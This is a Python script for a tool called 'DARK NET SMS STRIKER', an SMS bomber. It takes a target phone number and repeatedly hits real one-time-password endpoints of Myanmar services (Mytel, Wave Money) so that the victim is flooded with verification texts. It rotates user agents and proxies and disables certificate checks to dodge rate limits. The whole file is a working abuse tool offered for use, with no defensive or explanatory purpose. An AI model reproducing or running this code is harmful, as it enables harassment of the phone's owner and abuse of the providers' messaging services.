import os
import time
import json
import random
import threading
import requests
import urllib3
from rich.console import Console
from rich.panel import Panel
from rich.live import Live
from rich.layout import Layout
from rich.align import Align


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

class SMS_Striker:
    def __init__(self):
        self.success = 0
        self.failed = 0
        self.is_running = False
        self.logs = []
        self.target_phone = ""

        
        try:
            with open('useragent.json', 'r') as f:
                data = json.load(f)
                self.ua_list = data["user_agent"]
        except:
            self.ua_list = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)"]

    def format_phone(self, phone):
        
        phone = phone.strip().replace("+", "")
        if phone.startswith("09"):
            return "959" + phone[2:]
        return phone

    def get_proxy(self):
        
        try:
            if os.path.exists("proxies.txt") and os.path.getsize("proxies.txt") > 0:
                with open("proxies.txt", "r") as f:
                    proxies = f.read().splitlines()
                return {"http": "http://" + random.choice(proxies)}
            return None
        except: return None

    def attack(self, phone, amount):
        self.target_phone = self.format_phone(phone)
        count = 0

        
        api_pool = [
            {"n": "Mytel-G", "u": f"https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={self.target_phone}", "m": "GET"},
            {"n": "Mytel-P", "u": "https://apis.mytel.com.mm/api/3party/otp_service/sendOTPForPortal", "m": "POST", "d": {"msisdn": self.target_phone, "serviceType": "PORTAL"}},
            {"n": "Wave-R", "u": "https://api.wavemoney.io:8100/wmt-mfs-otp/v3/wmt-mfs-otp/register-customer", "m": "POST", "d": {"msisdn": self.target_phone, "device_id": f"kmh-{random.getrandbits(24)}", "language": "my"}},
            {"n": "Mytel-V", "u": "https://apis.mytel.com.mm/myid/authen/v1.0/v2/register/request", "m": "POST", "d": {"phoneNumber": self.target_phone}}
        ]

        while self.is_running and count < amount:
            api = random.choice(api_pool) 
            headers = {"User-Agent": random.choice(self.ua_list), "Content-Type": "application/json"}

            try:
                if api["m"] == "GET":
                    r = requests.get(api["u"], headers=headers, proxies=self.get_proxy(), timeout=7)
                else:
                    r = requests.post(api["u"], json=api["d"], headers=headers, proxies=self.get_proxy(), verify=False, timeout=7)

                if r.status_code in [200, 201]:
                    self.success += 1
                    self.logs.append(f"[bold green]▶ {api['n']} -> SUCCESS[/bold green]")
                else:
                    self.failed += 1
                    self.logs.append(f"[bold red]▶ {api['n']} -> FAILED ({r.status_code})[/bold red]")
            except:
                self.failed += 1

            count += 1
            if len(self.logs) > 12: self.logs.pop(0)
            time.sleep(random.uniform(1.0, 0.5)) 

        self.is_running = False

    def get_logo(self):
        logo = """
[bold red]  _____             _      _   _      _
 |  __ \           | |    | \ | |    | |
 | |  | | __ _ _ __| | __ |  \| | ___| |_
 | |  | |/ _` | '__| |/ / | . ` |/ _ \ __|
 | |__| | (_| | |  |   <  | |\  |  __/ |_
 |_____/ \__,_|_|  |_|\_\ |_| \_|\___|\__|[/bold red]
        [bold white]DARK NET SMS STRIKER v7.0[/bold white]
        """
        return Align.center(logo)

    def make_layout(self, amount):
        layout = Layout()
        layout.split_column(
            Layout(Panel(self.get_logo(), border_style="red"), size=10),
            Layout(name="body")
        )

        info = f"[bold cyan]🎯 Target  :[/bold cyan] {self.target_phone}\n"
        info += f"[bold cyan]🔢 Amount  :[/bold cyan] {amount}\n"
        info += f"[bold green]✅ Success :[/bold green] {self.success}\n"
        info += f"[bold red]❌ Failed  :[/bold red] {self.failed}\n\n"
        info += f"[bold yellow]👤 Creator :[/bold yellow] K.M.H 😎\n"
        info += f"[bold yellow]📡 Status  :[/bold yellow] [blink]STRIKING...[/blink]"

        layout["body"].split_row(
            Layout(Panel(info, title="[bold white]System Info[/bold white]", border_style="blue")),
            Layout(Panel("\n".join(self.logs), title="[bold white]Attack Logs[/bold white]", border_style="red"))
        )
        return layout

def main():
    os.system('clear')
    app = SMS_Striker()

    console.print(Panel(Align.center("[bold red]☣️ SYSTEM BREACH INITIATED ☣️[/bold red]\n[white]Created by K.M.H[/white]"), border_style="red"))

    phone = console.input("[bold yellow]Enter Target (09/959): [/bold yellow]")
    try:
        amount = int(console.input("[bold yellow]Enter Amount: [/bold yellow]"))
    except:
        amount = 50

    app.is_running = True
    threading.Thread(target=app.attack, args=(phone, amount), daemon=True).start()

    with Live(app.make_layout(amount), refresh_per_second=4) as live:
        while app.is_running:
            live.update(app.make_layout(amount))
            time.sleep(0.5)

    console.print(f"\n[bold green]✅ STRIKE COMPLETED! TOTAL INJECTED: {app.success}[/bold green]")

if __name__ == "__main__":
    main()

